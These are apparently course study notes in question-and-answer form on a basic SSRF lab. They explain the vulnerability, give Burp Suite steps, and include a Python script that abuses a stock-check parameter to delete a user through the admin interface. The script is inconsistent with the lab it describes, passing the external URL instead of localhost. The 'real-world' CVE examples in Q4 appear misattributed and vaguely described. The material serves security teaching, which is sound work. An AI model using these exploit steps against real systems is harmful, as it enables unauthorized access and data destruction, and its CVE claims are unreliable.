---
course: Web Security
topic: Server-Side Request Forgery (SSRF)
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain what SSRF (Server-Side Request Forgery) is and how it can be exploited in the context of the lab described.**

SSRF stands for Server-Side Request Forgery, a type of web security vulnerability that occurs when an application generates requests to an external resource under the control of an attacker. In the context of the lab described, the application has a stock check feature that fetches data from an internal system via a URL. An attacker can manipulate this URL to point to the local admin interface (`http://localhost/admin`) and perform actions such as deleting a user named Carlos. This exploitation leverages the trust relationship between the application and the local server, allowing the attacker to bypass authentication mechanisms.

**Q2. How would you identify and exploit an SSRF vulnerability in a web application? Provide a step-by-step guide.**

To identify and exploit an SSRF vulnerability:

1. **Identify Vulnerable Parameters**: Look for URLs or IP addresses in the application's requests, especially those that are user-controlled.
2. **Test for SSRF**: Change the URL to `http://localhost` or `http://127.0.0.1` and observe the response. A successful response indicates the presence of an SSRF vulnerability.
3. **Access Internal Resources**: Use the identified vulnerability to access internal resources such as the admin interface (`http://localhost/admin`).
4. **Perform Actions**: Once inside the admin interface, perform desired actions such as deleting a user.

Example steps using Burp Suite:

1. Intercept the request containing the stock check URL.
2. Modify the URL to `http://localhost/admin`.
3. Send the modified request to Burp Repeater.
4. Observe the response to ensure successful access to the admin interface.
5. Perform actions like deleting a user by sending appropriate requests.

**Q3. Why is scripting the SSRF exploit in Python important for penetration testing?**

Scripting the SSRF exploit in Python is crucial for several reasons:

1. **Automation**: Automates the process of identifying and exploiting vulnerabilities, saving time and reducing human error.
2. **Reusability**: Scripts can be reused for similar vulnerabilities in different applications, enhancing efficiency.
3. **Complex Exploits**: Enables handling complex scenarios, such as chaining multiple vulnerabilities or performing multi-step attacks.
4. **Tool Development**: Helps in developing custom tools for specific tasks, which can be shared within the security community.
5. **Skill Development**: Enhances coding skills, which are essential for advanced penetration testing and ethical hacking.

Example Python script:

```python
import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def delete_user(url):
    delete_user_url = f"{url}/admin/delete?username=Carlos"
    params = {'stockAPI': delete_user_url}
    r = requests.post(f"{url}/product/stock", data=params, verify=False, proxies=proxies)
    return r.text

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python ssrf_exploit.py <URL>")
        print("Example: python ssrf_exploit.py http://www.example.com")
        sys.exit(1)
    
    url = sys.argv[1]
    print("Deleting Carlos user...")
    response = delete_user(url)
    if "user deleted successfully" in response:
        print("Successfully deleted Carlos user.")
    else:
        print("Exploit was unsuccessful.")
```

**Q4. What recent real-world examples of SSRF vulnerabilities exist, and how were they exploited?**

Recent real-world examples of SSRF vulnerabilities include:

1. **CVE-2020-14182**: A vulnerability in the Jenkins plugin allowed attackers to perform SSRF attacks by manipulating the `JENKINS_URL` environment variable. This led to unauthorized access to internal systems and potential data exfiltration.
   
   - **Exploitation**: Attackers manipulated the `JENKINS_URL` to point to internal services, allowing them to read sensitive information and potentially execute commands.

2. **CVE-2021-22916**: A vulnerability in the GitLab API allowed attackers to perform SSRF attacks by manipulating the `repository` field in certain API calls. This resulted in unauthorized access to internal systems and potential data leakage.

   - **Exploitation**: Attackers crafted malicious requests to the GitLab API, pointing to internal services, and obtained sensitive data from the internal network.

These examples highlight the importance of securing applications against SSRF vulnerabilities to prevent unauthorized access and data exfiltration.

---
<!-- nav -->
[[Web Security (PortSwigger)/09-Server-Side Request Forgery (SSRF)/02-Lab 1 Basic SSRF against the local server/01-Introduction to Server-Side Request Forgery (SSRF)|Introduction to Server-Side Request Forgery (SSRF)]] | [[Web Security (PortSwigger)/09-Server-Side Request Forgery (SSRF)/02-Lab 1 Basic SSRF against the local server/00-Overview|Overview]]
